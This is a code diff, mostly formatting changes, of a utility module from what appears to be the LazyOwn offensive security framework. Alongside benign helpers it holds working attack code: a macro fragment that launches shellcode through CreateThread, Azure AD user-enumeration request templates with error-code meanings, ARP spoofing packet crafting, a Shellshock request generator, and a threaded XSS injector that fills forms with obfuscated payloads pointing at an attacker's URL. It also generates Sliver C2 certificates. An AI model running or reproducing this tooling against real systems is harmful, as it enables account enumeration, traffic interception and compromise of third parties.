@@ -149,9 +149,7 @@ IPAddress = optional_attr("netaddr", "IPAddress")
 IPRange = optional_attr("netaddr", "IPRange")
 transport = optional_attr("impacket.dcerpc.v5", "transport")
 IObjectExporter = optional_attr("impacket.dcerpc.v5.dcomrt", "IObjectExporter")
-RPC_C_AUTHN_LEVEL_NONE = optional_attr(
-    "impacket.dcerpc.v5.rpcrt", "RPC_C_AUTHN_LEVEL_NONE"
-)
+RPC_C_AUTHN_LEVEL_NONE = optional_attr("impacket.dcerpc.v5.rpcrt", "RPC_C_AUTHN_LEVEL_NONE")
 
 
 query_id = 0
@@ -180,11 +178,26 @@ RUN_AS_ROOT = False
 USER_ALIASES_FILE = "user_aliases.json"
 HEADLESS = False
 
-os.environ.setdefault('OPENSSL_CONF', '/etc/ssl/openssl.cnf')
+os.environ.setdefault("OPENSSL_CONF", "/etc/ssl/openssl.cnf")
 REQUIRED_KEYS = [
-    "id", "name", "description", "technique_name", "target_os", "binary",
-    "lang", "output_path", "path_src", "target_path", "command", "payload",
-    "clean_cmd", "compile", "droper", "replace_command", "copy_command", "sleep"
+    "id",
+    "name",
+    "description",
+    "technique_name",
+    "target_os",
+    "binary",
+    "lang",
+    "output_path",
+    "path_src",
+    "target_path",
+    "command",
+    "payload",
+    "clean_cmd",
+    "compile",
+    "droper",
+    "replace_command",
+    "copy_command",
+    "sleep",
 ]
 global payload_url, target_domain, concurrency, request_timeout, include_subdomains
 OLD_BANNER = f"""{GREEN}
@@ -247,14 +260,18 @@ C;X1;Y9;ENEXT()
 C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
 C;X1;Y11;EHALT()
 """
-detailed_codes = {'AADSTS50034' : 'The user does not exist',
-'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
-'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
-'AADSTS50126' : 'The user exists, but the wrong password was entered',
-'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded',
-'AADSTS81016' : 'Invalid STS Request (User likely exists)' }
+detailed_codes = {
+    "AADSTS50034": "The user does not exist",
+    "AADSTS50053": "The user exists and the correct username and password were entered, but the account is locked",
+    "AADSTS50056": "The user exists but does not have a password in Azure AD",
+    "AADSTS50126": "The user exists, but the wrong password was entered",
+    "AADSTS80014": "The user exists, but the maximum Pass-through Authentication time was exceeded",
+    "AADSTS81016": "Invalid STS Request (User likely exists)",
+}
 
-url_template = string.Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")
+url_template = string.Template(
+    """https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid"""
+)
 
 xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
 <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
@@ -288,6 +305,8 @@ xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
     </trust:RequestSecurityToken>
   </s:Body>
 </s:Envelope>""")
+
+
 def parse_ip_mac(input_string):
     """
     Extracts IP and MAC addresses from a formatted input string using a regular expression.
@@ -326,26 +345,24 @@ def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
         bytes: The constructed ARP packet containing the Ethernet and ARP headers.
     """
     eth_header = struct.pack(
-        '!6s6sH',
-        binascii.unhexlify(dst_mac.replace(':', '')),
-        binascii.unhexlify(src_mac.replace(':', '')),
-        0x0806
+        "!6s6sH", binascii.unhexlify(dst_mac.replace(":", "")), binascii.unhexlify(src_mac.replace(":", "")), 0x0806
     )
 
     arp_header = struct.pack(
-        '!HHBBH6s4s6s4s',
+        "!HHBBH6s4s6s4s",
         0x0001,
         0x0800,
         6,
         4,
         0x0002,
-        binascii.unhexlify(src_mac.replace(':', '')),
+        binascii.unhexlify(src_mac.replace(":", "")),
         socket.inet_aton(src_ip),
-        binascii.unhexlify(dst_mac.replace(':', '')),
-        socket.inet_aton(dst_ip)
+        binascii.unhexlify(dst_mac.replace(":", "")),
+        socket.inet_aton(dst_ip),
     )
 
     return eth_header + arp_header
+
 
 def send_packet(packet, iface):
     """
@@ -364,6 +381,7 @@ def send_packet(packet, iface):
         sock.bind((iface, 0))
         sock.send(packet)
 
+
 def load_version():
     """
     Load the version number from the 'version.json' file.
@@ -379,11 +397,12 @@ def load_version():
     - str: The version number from the file or the default version if the file is not found or the version key is missing.
     """
     try:
-        with open('version.json', 'r') as f:
+        with open("version.json", "r") as f:
             data = json.load(f)
-            return data.get('version', 'release/0.2.157')
+            return data.get("version", "release/0.2.157")
     except FileNotFoundError:
-        return 'release/0.2.157'
+        return "release/0.2.157"
+
 
 version = load_version()
 url_download = f"https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz"
@@ -423,9 +442,7 @@ def signal_handler(sig, frame):
     """
 
     global should_exit
-    print_warn(
-        f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}"
-    )
+    print_warn(f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}")
     should_exit = True
     readline.set_history_length(0)
     return
@@ -539,9 +556,10 @@ def rotate_char(c, shift):
     """
 
     if c in string.ascii_letters:
-        start = ord('a') if c.islower() else ord('A')
+        start = ord("a") if c.islower() else ord("A")
         return chr((ord(c) - start + shift) % 26 + start)
     return c
+
 
 def get_network_info():
     """
@@ -556,31 +574,37 @@ def get_network_info():
              are their associated IP addresses.
     :rtype: dict
     """
-    command = ['ip', 'a', 'show', 'scope', 'global']
+    command = ["ip", "a", "show", "scope", "global"]
     result = subprocess.run(command, capture_output=True, text=True)
     output = result.stdout.strip()
     network_info = {}
     current_iface = None
 
-    for line in output.split('\n'):
+    for line in output.split("\n"):
         import re
-        iface_match = re.match(r'^[0-9]+:\s+(\S+?):', line)
+
+        iface_match = re.match(r"^[0-9]+:\s+(\S+?):", line)
         if iface_match:
             current_iface = iface_match.group(1)
             continue
-        if current_iface and line.strip().startswith('inet '):
+        if current_iface and line.strip().startswith("inet "):
             parts = line.strip().split()
             if len(parts) >= 2:
-                addr = parts[1].split('/')[0]
+                addr = parts[1].split("/")[0]
                 network_info[current_iface] = addr
 
     return network_info
 
+
 def get_git_info():
     try:
-        branch = subprocess.check_output(['git', 'rev-parse', '--abbrev-ref', 'HEAD'], stderr=subprocess.DEVNULL).decode('utf-8').strip()
-        modified = subprocess.call(['git', 'diff', '--quiet'], stderr=subprocess.DEVNULL) != 0
-        staged = subprocess.call(['git', 'diff', '--staged', '--quiet'], stderr=subprocess.DEVNULL) != 0
+        branch = (
+            subprocess.check_output(["git", "rev-parse", "--abbrev-ref", "HEAD"], stderr=subprocess.DEVNULL)
+            .decode("utf-8")
+            .strip()
+        )
+        modified = subprocess.call(["git", "diff", "--quiet"], stderr=subprocess.DEVNULL) != 0
+        staged = subprocess.call(["git", "diff", "--staged", "--quiet"], stderr=subprocess.DEVNULL) != 0
         if modified or staged:
             return f" {BRIGHT_RED}✗{RESET} {BRIGHT_YELLOW}{branch}{RESET}"
         else:
@@ -590,11 +614,13 @@ def get_git_info():
     except subprocess.CalledProcessError:
         return ""
 
+
 def get_venv_info():
-    if 'VIRTUAL_ENV' in os.environ:
-        venv_name = os.path.basename(os.environ['VIRTUAL_ENV'])
+    if "VIRTUAL_ENV" in os.environ:
+        venv_name = os.path.basename(os.environ["VIRTUAL_ENV"])
         return f" ({BRIGHT_BLUE}🐍{venv_name}{RESET})"
     return ""
+
 
 def _load_prompt_payload() -> dict:
     """Read ``payload.json`` defensively for the prompt renderer.
@@ -627,6 +653,7 @@ def getprompt():
         return f"{BRIGHT_CYAN}$ {RESET}"
     return render_prompt(_load_prompt_payload())
 
+
 def copy2clip(text):
     """
     Copia el texto proporcionado al portapapeles usando xclip.
@@ -638,7 +665,7 @@ def copy2clip(text):
         copy2clip("Hello, World!")
     """
     try:
-        subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
+        subprocess.run(["xclip", "-selection", "clipboard"], input=text.encode(), check=True)
         print_msg(f"Text copied to clipboard. {text}")
         return text
     except subprocess.CalledProcessError as e:
@@ -646,16 +673,18 @@ def copy2clip(text):
     except FileNotFoundError:
         print_error("xclip not found `sudo apt-get install xclip`.")
 
+
 def clean_output(output):
     """Removes color escape sequences and other non-printable characters."""
 
-    output = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
-    output = re.sub(r'(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])', '', output)
-    output = re.sub(r'\\(?:33\[K|10|7)', '', output)
-    output = re.sub(r' +', ' ', output)
-    output = '\n'.join(line.strip() for line in output.split('\n') if line.strip())
+    output = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", output)
+    output = re.sub(
+        r"(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])", "", output
+    )
+    output = re.sub(r"\\(?:33\[K|10|7)", "", output)
+    output = re.sub(r" +", " ", output)
+    output = "\n".join(line.strip() for line in output.split("\n") if line.strip())
     return output
-
 
 
 def teclado_usuario(filename):
@@ -670,18 +699,18 @@ def teclado_usuario(filename):
         Exception: Para otros errores que puedan ocurrir.
     """
     try:
-        with open(filename, 'r') as file:
+        with open(filename, "r") as file:
             content = file.readlines()
 
         output = ""
         for line in content:
-            if line.startswith('write(5,'):
+            if line.startswith("write(5,"):
                 match = re.search(r'write\(5, "(.*?)"', line)
                 if match:
                     char = match.group(1)
-                    if char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.':
+                    if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.":
                         output += char
-                    elif char == '\\n':
+                    elif char == "\\n":
                         print(output)
                         output = ""
 
@@ -692,7 +721,6 @@ def teclado_usuario(filename):
         print(f"Archivo {filename} no encontrado.")
     except Exception as e:
         print(f"Error: {e}")
-
 
 
 def salida_strace(filename):
@@ -707,12 +735,12 @@ def salida_strace(filename):
         Exception: Para otros errores que puedan ocurrir.
     """
     try:
-        with open(filename, 'r') as file:
+        with open(filename, "r") as file:
             content = file.readlines()
 
         output = ""
         for line in content:
-            if line.startswith('write(5,'):
+            if line.startswith("write(5,"):
                 match = re.search(r'write\(5, "(.*?)"', line)
                 if match:
                     text = match.group(1)
@@ -750,29 +778,25 @@ def exploitalert(content):
     """
     try:
         if len(content) != 0:
-
             print_msg(f"|{GREEN}+ ExploitAlert Result {WHITE}")
             print_msg("|------------------------")
-
 
             predata = []
             for data in content:
                 print_msg(f"|{BLUE}-{WHITE} Title : {data['name']}")
                 print_msg(f"|{BLUE}-{WHITE} Link : https://www.exploitalert.com/view-details.html?id={data['id']}")
 
-
-
-                predata.append({
-                    "title" : data['name'],
-                    "link" : f"https://www.exploitalert.com/view-details.html?id={data['id']}"
-                })
+                predata.append(
+                    {"title": data["name"], "link": f"https://www.exploitalert.com/view-details.html?id={data['id']}"}
+                )
             print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(content)}{WHITE} Exploits Found!")
-            data.append({"exploitalert" : predata})
+            data.append({"exploitalert": predata})
         else:
             print_error(f"|{RED}- No result in ExploitAlert!{WHITE}")
     except Exception:
         print_error(f"|{RED}- Internal Error - No result in ExploitAlert!{WHITE}")
     return
+
 
 def packetstormsecurity(content):
     """
@@ -794,7 +818,6 @@ def packetstormsecurity(content):
     try:
         reg = re.findall('<dt><a class="ico text-plain" href="(.*?)" title="(.*?)">(.*?)</a></dt>', content)
         if len(reg) != 0:
-
             print_msg(f"|{GREEN}+ PacketStorm Result {WHITE}")
             print_msg("|-----------------------")
 
@@ -803,18 +826,15 @@ def packetstormsecurity(content):
                 print_msg(f"|{BLUE}-{WHITE} Title : {data[2]}")
                 print_msg(f"|{BLUE}-{WHITE} Link : https://packetstormsecurity.com{data[0]}")
 
-
-                predata.append({
-                    "title" : data[2],
-                    "link" : f"https://packetstormsecurity.com{data[0]}"
-                })
+                predata.append({"title": data[2], "link": f"https://packetstormsecurity.com{data[0]}"})
             print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(reg)}{WHITE} Exploits Found!")
-            data.append({"packetstormsecurity" : predata})
+            data.append({"packetstormsecurity": predata})
         else:
             print_error(f"|{RED}- No result in PacketStorm!{WHITE}")
     except Exception:
         print_error(f"|{RED}- Internal Error - No result in PacketStorm!{WHITE}")
     return
+
 
 def nvddb(content):
     """
@@ -834,24 +854,26 @@ def nvddb(content):
     An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
     """
     try:
-        if len(content['vulnerabilities']) != 0:
+        if len(content["vulnerabilities"]) != 0:
             print_msg(f"{GREEN}|-----------------------------------------------")
             print_msg(f"{GREEN}|+ National Vulnearbility Database Result       +{WHITE}")
             print_msg(f"{GREEN}|-----------------------------------------------")
 
             predata = []
-            for data in content['vulnerabilities']:
+            for data in content["vulnerabilities"]:
                 print_msg(f"{BLUE}-{BG_YELLOW}{RED} ID : {data['cve']['id']}")
                 print_msg(f"{BLUE}-{BG_BLACK}{WHITE} Description : {data['cve']['descriptions'][0]['value']}")
                 print_msg(f"{BLUE}-{BG_BLACK}{BLUE} Link : https://nvd.nist.gov/vuln/detail/{data['cve']['id']}")
 
-                predata.append({
-                    "title" : data['cve']['id'],
-                    "description" : data['cve']['descriptions'][0]['value'],
-                    "link" : f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}"
-                })
+                predata.append(
+                    {
+                        "title": data["cve"]["id"],
+                        "description": data["cve"]["descriptions"][0]["value"],
+                        "link": f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}",
+                    }
+                )
             print_msg(f"|{BLUE}-{RED} Total Result : {GREEN}{len(content)}{YELLOW} CVEs Found!")
-            data.append({"nvddb" : predata})
+            data.append({"nvddb": predata})
         else:
             print_error("|")
             print_error(f"|{RED}- No result in National Vulnearbility Database!{WHITE}")
@@ -859,7 +881,8 @@ def nvddb(content):
         print_error(f"|{RED}- Internal Error - No result in National Vulnearbility Database!{WHITE}")
     return
 
-def find_ss(keyword = ""):
+
+def find_ss(keyword=""):
     """
     Find CVEs in the National Vulnerability Database based on a keyword.
 
@@ -880,22 +903,35 @@ def find_ss(keyword = ""):
     keyword_encoded = keyword.replace(" ", "%20")
     import shutil as _shutil
     import subprocess as _sp
+
     curl = _shutil.which("curl")
     if curl:
         try:
             result = _sp.run(
-                [curl, "-sS", "--connect-timeout", "5", "--max-time", "12",
-                 f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}"],
-                capture_output=True, text=True, timeout=15,
+                [
+                    curl,
+                    "-sS",
+                    "--connect-timeout",
+                    "5",
+                    "--max-time",
+                    "12",
+                    f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=15,
             )
             if result.returncode == 0 and result.stdout.strip():
                 import json as _json
+
                 return _json.loads(result.stdout)
             return False
         except (_sp.TimeoutExpired, Exception):
             return False
     try:
-        resp = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}", timeout=(3, 8))
+        resp = requests.get(
+            f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}", timeout=(3, 8)
+        )
         if resp.status_code == 200:
             return resp.json()
         else:
@@ -906,6 +942,7 @@ def find_ss(keyword = ""):
     except requests.exceptions.RequestException as exc:
         print_error(f"NVD API request failed: {exc}")
         return False
+
 
 def find_ea(keyword=""):
     """
@@ -927,22 +964,35 @@ def find_ea(keyword=""):
     keyword = f"{keyword}"
     import shutil as _shutil
     import subprocess as _sp
+
     curl = _shutil.which("curl")
     if not curl:
         return False
     try:
         result = _sp.run(
-            [curl, "-sS", "--connect-timeout", "5", "--max-time", "8",
-             "-H", "User-Agent: LazyOwn/1.0",
-             f"https://www.exploitalert.com/api/search-exploit?name={keyword}"],
-            capture_output=True, text=True, timeout=10,
+            [
+                curl,
+                "-sS",
+                "--connect-timeout",
+                "5",
+                "--max-time",
+                "8",
+                "-H",
+                "User-Agent: LazyOwn/1.0",
+                f"https://www.exploitalert.com/api/search-exploit?name={keyword}",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=10,
         )
         if result.returncode == 0 and result.stdout.strip():
             import json as _json
+
             return _json.loads(result.stdout)
         return False
     except (_sp.TimeoutExpired, Exception):
         return False
+
 
 def find_ps(keyword=""):
     """
@@ -974,6 +1024,7 @@ def find_ps(keyword=""):
     except requests.exceptions.RequestException as exc:
         print_error(f"PacketStorm API request failed: {exc}")
         return False
+
 
 def run(command):
     """
@@ -1009,6 +1060,7 @@ def run(command):
     try:
         print_msg(f"Attempting to execute: {_redact(command)}")
         from core.safe_subprocess import SafeRunner
+
         result = SafeRunner().run_shell(
             command,
             allow=True,
@@ -1031,6 +1083,7 @@ def run(command):
     except Exception as e:
         print_error(f"An unexpected error occurred: {str(e)}")
         return str(e)
+
 
 def is_exist(file):
     """Check if a file exists.
@@ -1060,6 +1113,7 @@ def is_exist(file):
         return False
     return True
 
+
 def get_domain(url):
     """
     Extracts the domain from a given URL.
@@ -1070,11 +1124,12 @@ def get_domain(url):
     Returns:
     str: The extracted domain from the URL, or None if it cannot be extracted.
     """
-    pattern = r'^(?:https?://)?(?:www\.)?([^/]+)'
+    pattern = r"^(?:https?://)?(?:www\.)?([^/]+)"
     match = re.search(pattern, url)
     if match:
         return match.group(1)
     return None
+
 
 def generate_random_cve_id():
     """
@@ -1103,33 +1158,73 @@ def generate_certificates():
 
         # Generate the CA certificate
         print_msg("Generating CA certificate...")
-        subprocess.run([
-            "sudo", "openssl", "req", "-x509", "-new", "-nodes", "-keyout", "ca_key.pem",
-            "-out", ca_cert_path, "-days", "365", "-subj", "/CN=SliverCA"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "req",
+                "-x509",
+                "-new",
+                "-nodes",
+                "-keyout",
+                "ca_key.pem",
+                "-out",
+                ca_cert_path,
+                "-days",
+                "365",
+                "-subj",
+                "/CN=SliverCA",
+            ],
+            check=True,
+        )
 
         # Generate the client key
         print_msg("Generating client key...")
-        subprocess.run([
-            "sudo", "openssl", "genrsa", "-out", client_key_path, "2048"
-        ], check=True)
+        subprocess.run(["sudo", "openssl", "genrsa", "-out", client_key_path, "2048"], check=True)
 
         # Generate the client certificate signing request (CSR)
         print_msg("Generating client CSR...")
-        subprocess.run([
-            "sudo", "openssl", "req", "-new", "-key", client_key_path, "-out", "client_csr.pem",
-            "-subj", "/CN=SliverClient"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "req",
+                "-new",
+                "-key",
+                client_key_path,
+                "-out",
+                "client_csr.pem",
+                "-subj",
+                "/CN=SliverClient",
+            ],
+            check=True,
+        )
 
         # Sign the client CSR with the CA key to create the client certificate
         print_msg("Generating client certificate...")
-        subprocess.run([
-            "sudo", "openssl", "x509", "-req", "-in", "client_csr.pem", "-CA", ca_cert_path,
-            "-CAkey", "ca_key.pem", "-CAcreateserial", "-out", client_cert_path,
-            "-days", "365"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "x509",
+                "-req",
+                "-in",
+                "client_csr.pem",
+                "-CA",
+                ca_cert_path,
+                "-CAkey",
+                "ca_key.pem",
+                "-CAcreateserial",
+                "-out",
+                client_cert_path,
+                "-days",
+                "365",
+            ],
+            check=True,
+        )
 
         return ca_cert_path, client_cert_path, client_key_path
+
 
 def generate_emails(full_name, domain):
     """
@@ -1185,20 +1280,24 @@ def generate_emails(full_name, domain):
         f"{last_initial}{first_name}@{domain}",
         f"{last_initial}.{first_name}@{domain}",
         f"{last_initial}{first_initial}@{domain}",
-        f"{last_initial}.{first_initial}@{domain}"
+        f"{last_initial}.{first_initial}@{domain}",
     ]
 
     return permutations
+
+
 def clean_url(host):
     """Checks if the last character is a slash and removes it if so."""
-    if host.endswith('/'):
-        host = host.rstrip('/')
+    if host.endswith("/"):
+        host = host.rstrip("/")
     return host
+
 
 def random_string(length=15):
     """Generates a random alphanumeric string."""
     letters = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters) for i in range(length))
+    return "".join(random.choice(letters) for i in range(length))
+
 
 def generate_http_req(host, port, uri, custom_header=None, cmd=None):
     """Generates an HTTP request with the Shellshock payload."""
@@ -1210,11 +1309,7 @@ def generate_http_req(host, port, uri, custom_header=None, cmd=None):
 
     headers = {}
     if custom_header is None:
-        headers = {
-            'User-Agent': payload,
-            'Referer': payload,
-            'Cookie': payload
-        }
+        headers = {"User-Agent": payload, "Referer": payload, "Cookie": payload}
     else:
         headers[custom_header] = payload
 
@@ -1226,6 +1321,7 @@ def generate_http_req(host, port, uri, custom_header=None, cmd=None):
         return response, None
     else:
         return response, nonce
+
 
 def format_openssh_key(raw_key):
     """
@@ -1251,12 +1347,13 @@ def format_openssh_key(raw_key):
     key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
 
     # Split into 64-character lines
-    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
+    formatted_key_content = "\n".join([key_content[i : i + 64] for i in range(0, len(key_content), 64)])
 
     # Reassemble the key with the header and footer, and add necessary line breaks
     formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
 
     return formatted_key
+
 
 def format_rsa_key(raw_key):
     """
@@ -1281,12 +1378,13 @@ def format_rsa_key(raw_key):
     key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
 
     # Split into 64-character lines
-    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
+    formatted_key_content = "\n".join([key_content[i : i + 64] for i in range(0, len(key_content), 64)])
 
     # Reassemble the key with the header and footer, and add necessary line breaks
     formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
 
     return formatted_key
+
 
 def is_package_installed(package_name):
     """
@@ -1297,6 +1395,7 @@ def is_package_installed(package_name):
     """
 
     return importlib.util.find_spec(package_name) is not None
+
 
 def extract(string, extract_flag):
     """
@@ -1321,6 +1420,7 @@ def extract(string, extract_flag):
     else:
         return string
 
+
 def clean_html(html_string):
     """
     Remove HTML tags from a string.
@@ -1330,10 +1430,9 @@ def clean_html(html_string):
     :param html_string: A string containing HTML content.
     :returns: A cleaned string with HTML tags removed.
     """
-    clean_pattern = re.compile(r'<.*?>')
-    cleaned_string = re.sub(clean_pattern, '', html_string)
+    clean_pattern = re.compile(r"<.*?>")
+    cleaned_string = re.sub(clean_pattern, "", html_string)
     return cleaned_string.strip()
-
 
     """
     Generates a random CVE (Common Vulnerabilities and Exposures) ID.
@@ -1367,7 +1466,9 @@ def get_credentials(file=None, ncred=None):
     credential_files = glob.glob(f"{path}/sessions/credentials*.txt")
 
     if not credential_files:
-        print_error(f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin")
+        print_error(
+            f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin"
+        )
         return []
 
     if ncred is not None:
@@ -1402,6 +1503,7 @@ def get_credentials(file=None, ncred=None):
 
     return credentials
 
+
 def obfuscate_payload(payload):
     """
     Obfuscates a payload string by converting its characters into hexadecimal format,
@@ -1426,6 +1528,7 @@ def obfuscate_payload(payload):
             obfuscated += f"\\x{hex(ord(c))[2:]}"
     return obfuscated
 
+
 def read_payloads(file_path):
     """
     Reads a file containing payloads and returns a list of properly formatted strings.
@@ -1441,11 +1544,12 @@ def read_payloads(file_path):
         list: A list of strings, each representing a payload from the file, formatted with
               leading and trailing double quotes if necessary.
     """
-    with open(file_path, 'r') as file:
+    with open(file_path, "r") as file:
         lines = file.readlines()
 
     payloads = [line.strip() if line.startswith('"') else f'"{line.strip()}"' for line in lines]
     return payloads
+
 
 def inject_payloads(urls, payload_url, request_timeout=15):
     """
@@ -1470,12 +1574,12 @@ def inject_payloads(urls, payload_url, request_timeout=15):
         requests.RequestException: Raises an exception if any HTTP request fails, which is handled
                                    by printing a warning message.
     """
-    payloads = read_payloads('modules/XssPayloads.txt')
+    payloads = read_payloads("modules/XssPayloads.txt")
 
     def send_request(raw_url):
         try:
-            if not raw_url.startswith(('http://', 'https://')):
-                raw_url = 'http://' + raw_url
+            if not raw_url.startswith(("http://", "https://")):
+                raw_url = "http://" + raw_url
             parsed_url = urllib.parse.urlparse(raw_url)
             query_params = urllib.parse.parse_qs(parsed_url.query)
 
@@ -1484,7 +1588,7 @@ def inject_payloads(urls, payload_url, request_timeout=15):
                     obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                     full_url = f"{raw_url}?xss={obfuscated_payload}"
                     print_msg(f"[INFO] Sending request to {full_url}")
-                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
                     resp.raise_for_status()
                     handle_forms(resp.content, full_url)
                 return
@@ -1496,44 +1600,48 @@ def inject_payloads(urls, payload_url, request_timeout=15):
                     query_string = urllib.parse.urlencode(query_params, doseq=True)
                     full_url = f"{raw_url}{query_string}&xss={obfuscated_payload}"
                     print_msg(f"[INFO] Sending request to {full_url}")
-                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
                     resp.raise_for_status()
                     handle_forms(resp.content, full_url)
 
             updated_query = urllib.parse.urlencode(query_params, doseq=True)
             full_url = parsed_url._replace(query=updated_query).geturl()
             print_msg(f"[INFO] Sending request to {full_url}")
-            resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+            resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
             resp.raise_for_status()
             handle_forms(resp.content, full_url)
         except requests.RequestException as e:
             print_warn(f"[WARN] Request failed for {raw_url}: {e}")
 
     def handle_forms(content, url):
-        soup = BeautifulSoup(content, 'html.parser')
-        forms = soup.find_all('form')
+        soup = BeautifulSoup(content, "html.parser")
+        forms = soup.find_all("form")
 
         if not forms:
             print_msg("[INFO] No forms found.")
             return
 
         for form in forms:
-            action = form.get('action', url)
-            if action.startswith('/'):
+            action = form.get("action", url)
+            if action.startswith("/"):
                 action = urllib.parse.urljoin(url, action)
 
-            method = form.get('method', 'GET').upper()
-            form_data = {input.get('name'): payloads[0].format(payload_url) for input in form.find_all('input') if input.get('name')}
+            method = form.get("method", "GET").upper()
+            form_data = {
+                input.get("name"): payloads[0].format(payload_url)
+                for input in form.find_all("input")
+                if input.get("name")
+            }
             if not form_data:
                 print_warn("[WARN] No input fields found in form.")
                 continue
-            urls_str = ''.join(urls)
+            urls_str = "".join(urls)
             action = f"http://{urls_str}/{action}"
             try:
-                if method == 'POST':
-                    resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+                if method == "POST":
+                    resp = requests.post(action, data=form_data, headers={"User-Agent": "Mozilla/5.0"})
                 else:
-                    resp = requests.get(action, params=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+                    resp = requests.get(action, params=form_data, headers={"User-Agent": "Mozilla/5.0"})
 
                 print_msg(f"[INFO] Form submission response from {action}: {resp.status_code}")
             except requests.RequestException as e:
@@ -1542,12 +1650,14 @@ def inject_payloads(urls, payload_url, request_timeout=15):
     with ThreadPoolExecutor(max_workers=20) as executor:
         executor.map(send_request, urls)
 
+
 def prompt(label, default=None):
     """
     Return the prompt in the function do_xss
     """
     value = input(f"    {GREEN}{label}: ").strip()
     return value if value else default
+
 
 def add(str_part, delimiter, i):
     """
@@ -1644,19 +1754,20 @@ def handle(input_str):
 
     return parts
 
-def get_users_dic(txt = None):
+
+def get_users_dic(txt=None):
     """
     List all .txt files in the 'sessions/' directory and prompt the user to select one by number.
 
     :returns: The path of the selected .txt file.
     """
-    path = os.path.join(os.getcwd(), 'sessions')
+    path = os.path.join(os.getcwd(), "sessions")
 
     if txt:
-        txt_files = [f for f in os.listdir(path) if f.endswith(f'.{txt}')]
+        txt_files = [f for f in os.listdir(path) if f.endswith(f".{txt}")]
     else:
         txt = "txt"
-        txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
+        txt_files = [f for f in os.listdir(path) if f.endswith(".txt")]
 
     if not txt_files:
         print_error(f"No .{txt} files found in 'sessions/' directory.")
@@ -1665,7 +1776,6 @@ def get_users_dic(txt = None):
     print_msg(f"Available .{txt} files:")
     for i, file in enumerate(txt_files):
         print_msg(f"    {i + 1}. {file}")
-
 
     try:
         choice = int(input(f"    [!] Choose a file by number (1-{len(txt_files)}): ").strip())
@@ -1679,7 +1789,8 @@ def get_users_dic(txt = None):
         print_warn("Invalid input. Please enter a number.")
         return None
 
-def get_hash(dir = None):
+
+def get_hash(dir=None):
     """
     Searches for hash files with the pattern 'hash*.txt' and allows the user to select one.
 
@@ -1719,6 +1830,7 @@ def get_hash(dir = None):
         print_error(f"Failed to read the hash file: {str(e)}")
         return ""
 
+
 def is_digit(the_digit):
     """Check if the given character is a digit.
 
@@ -1728,7 +1840,8 @@ def is_digit(the_digit):
     Returns:
         bool: True if the character is a digit, False otherwise.
     """
-    return the_digit in '0123456789'
+    return the_digit in "0123456789"
+
 
